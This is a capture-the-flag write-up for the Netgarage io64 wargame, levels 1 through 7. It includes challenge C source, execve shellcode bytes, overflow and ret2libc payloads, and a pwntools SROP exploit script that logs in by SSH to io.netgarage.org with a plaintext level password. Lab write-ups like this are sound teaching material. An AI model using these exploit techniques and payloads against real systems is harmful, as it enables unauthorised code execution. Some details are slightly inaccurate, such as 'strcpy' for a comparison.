# Netgarage io64

## Level1

Running the program greets us asking us to enter a password. I don't know what the password is, so lets run this programming using **ltrace** to see what library calls the function makes.

`man ltrace` shows:
```
ltrace is a program that simply runs the specified command until it exits.  It intercepts and records the dynamic library calls which are called by the executed process
```

Running this we see that there is a call to strcpy, which checks our entered string with "Administ". Entering this into the program pops a shell, and we can get the password to the next level
`cat /home/level2/.pass`

## Level2

Supplied source
```C
#include <unistd.h>


int main(int i, long *a) {
    if(a[1] * 0x1064deadbeef4601u == 0xd1038d2e07b42569u)
        execl("/bin/sh", "sh", 0);
    return 0;
}

```

This challenge isn't so much as a binary challenge, as a math challenge. 
The program takes the first argument, as a number, multiplies it by a large number, and checks if the answer is *0xd1038d2e07b42569u*.

But this multiplication includes integer overflow, and all the fun that comes with that.

Instead of doing this by hand, we can use a symbolic solver, such as z3, pass in the arguments for the equation, and it should spit out the solution.

```

sudo apt install python-z3
python
>>> from z3 import *
>>> s = Solver()
>>> x = BitVec('x', 64)
>>> s.add(x * 0x1064deadbeef4601 == 0xd1038d2e07b42569)
>>> s.check()
sat
>>> s.model()
[x = 8319100071223652201]
>>> hex(8319100071223652201)
'0x7373617034366f69'
>>> '7373617034366f69'.decode('hex')
'ssap46oi'
>>> '7373617034366f69'.decode('hex')[::-1]
'io64pass'
```
Ahh so the solution is to enter io64pass backwards. Entering this as the argument to the program pops a shell for us.
We can now move on to the next challenge.

## Level3

Program source

```C
#include <stdio.h>
#include <string.h>
#include <unistd.h>
 
struct {
        char buf[16];
        void (*fp)(int i);
} opts;
 
void f(int i) {
        i != 0xdeadbeef && puts("FAIL!") || puts("WIN!") && execl("/bin/sh", "sh", NULL);
}
 
int main(int argc, char *argv[]) {
        int i;
        opts.fp = f;
        for(i = 0; i <= 16 && argv[1][i]; i++)
                opts.buf[i] = argv[1][i];
        opts.fp(0);
}
```

From inspection, the program appears to copy __17__ bytes of data from the argument variable, into a __16__ byte string stored in the struct opts.

It then calls `opts.fp(0)`, Which will do nothing as **i == 0 != 0xdeadbeef**.

Now as we are copying 17 bytes into a 16 byte buffer, we will overwrite one byte of the function pointer.
Now what should we overwrite it to? Well since the memory is stored in a **little endian** format, the last byte is the least significant byte.

Since it is the least significant byte, we can't jump somewhere far away, like libc. We have to jump to somewhere in the same code region.

Well the win/execve code is at *0x40057c*. So if we can change the last byte to be 7c, it should jump past the `i == 0xdeadbeef` condition, and pop a shell.

So our payload will be `'A' * 16 + '\x7c'.`
Running this into the program prints WIN!, then pops a shell.

**Yay!**

## Level4

Program source

```C
#include <string.h>
 
int dobug(char *arg) {
        char buf[8];
        strcpy(buf, arg);
}
 
int main(int argc, char *argv[]) {
        return dobug(argv[1]);
}
```

So... inspecting this program, we see that it calls a function `dobug()` which copies (`strcpy`) a string from the argument, into a buffer.

`strcpy` doesn't check length, so it will keep copying until a null byte. 

We can fuzz the input to see when we can overrite the return address. Since this is a 64 bit system it takes more bytes than usual.
After entering 24 'A's I get a Segmentation fault.

So we have 24 bytes before we overwrite the return address.

We can also run the program in gdb, after the program returns we can view the registers with **info registers**
` RAX  0x7fffffffdc10 ◂— 'AAAAAAAAAAAAA'`
We see that our string in in the rax register

We can also use *ropper* to find possible rop chains.
I find `Call RAX : 0x400477`

So we need shell code to fill in the buffer. We need it to be less than 24 bytes. 
I found this push-execve shell code that is 23 bytes long

`"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"`

However if we just use this, since the shellcode is on the stack, it will overwrite itself. (It contains the push command several times). What we can do is add one instruction \x5c (pop esp), which will pivot the stack, so that the pushes are moved elsewhere.

Let's construct our payload

```python
attack = "\x5c" #pop esp
attack += "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05" #shellcode
attack += "\x77\x04\x40" #return addresss

```

## Level5

Code is
```C
#include <string.h>

int dobug(char *arg) {
	char buf[8];
	strcpy(buf, arg);
}

int main(int argc, char *argv[]) {
	return dobug(argv[1]);
}
//no aslr + nx

//binsh = 0x00482cf5
//binsh = buf[8]
//poprdi = 0x400b60
//syste = 0x401550
```

Initial inspection on the provided binary shows that *ASLR* is disabled. I also notice that the size of the file is massive, and upon closer inspection of the disassembly, we see that the libc is dynamically linked into the program.

This means we can easily do a ret2libc attack on the binary.
A good function to jump to is do_system, we can find the address of do_system using objdump
`objdump -d ./level05 | grep '<do_system>'` 

So do_system is at the address **\xef\x15\x40**

Fuzzing the input with *A*'s we can find the breaking point of the program. Like before, there are 24 bytes before the return address of the program. 

Do_system takes one parameter, which is the path to the program it needs to run.
Let's run the program in gdb and see what we can do. Similarly to the previous challenge, the string is already in rdi. So what we can do is insert "/bin/sh;" followed by some padding, and then our return address. 

Let's construct our payload then

```python
attack = "/bin/sh;" #/bin/sh;
attack += "A" * (24 - 8) #padding for return address
attack += "\xef\x15\x40" #return address into do_system
print attack
```


## Level7

Provided Code

```C
// level by daehee(daehee87@kaist.ac.kr)
// Nothing hidden just, linux 3.3, gcc level.c
#include <stdio.h>
void main(){
	int buf[4];
	read(0, buf, 512);
}
```

For this challenge we are going to be using a method of return orientated programming called sigreturn orientated programming. This involves invoking sigreturn syscall, to set all registers in one go.

The shell script below should be self explanatory. First we set pivot the stack to a new address, then we upload our srop gadget and run it

Exploit script


```python
from pwn import *

context.clear(arch='amd64')


user = 'level7'
password = 'KRTqdkaQEd3Tq3PU'
port = 2264
host = 'io.netgarage.org'
filebase = '/levels/level07'

#function to pad and truncate strings as required
def pad(s, n):
	if len(s) > n:
		return s
	return s + 'P' * (n - len(s))

def trunc(s, n):
	return str(s)[:n]


s = ssh(user=user, host=host, port=port, password=password)
p = s.run([filebase])

#base pointers
new_rbp = p64(0x600910)
new_rbp1 = p64(0x600920)

#address of function calls
ret = p64(0x400530)
read = p64(0x400514)
syscall = p64(0xffffffffff600007)

#execve sig return frame
sigRet = SigreturnFrame()
sigRet.rax = 59  #execve Syscall number
sigRet.rdi = 0x600900 
sigRet.rsi = 0x0
sigRet.rdx = 0x0
sigRet.rsp = 0x600990 
sigRet.rip = 0xffffffffff600007 #address of syscall
             

raw_input("Press enter to move stack") 
p.send('A' * 16 + new_rbp + read) #move stack and call read again

raw_input("press enter to set up stack")

payload = pad('/bin/sh\x00', 0x10) + new_rbp1 + read + ret + syscall + str(sigRet) #call a read to set up new stack finally, then call sig return
p.send(payload) #enter our data onto new stack


raw_input("press enter to set up rax")
p.send('A' * 0x8 + trunc(ret, 0x7)) #set rax for sigreturn then run for syscall


p.interactive()#interactive console
```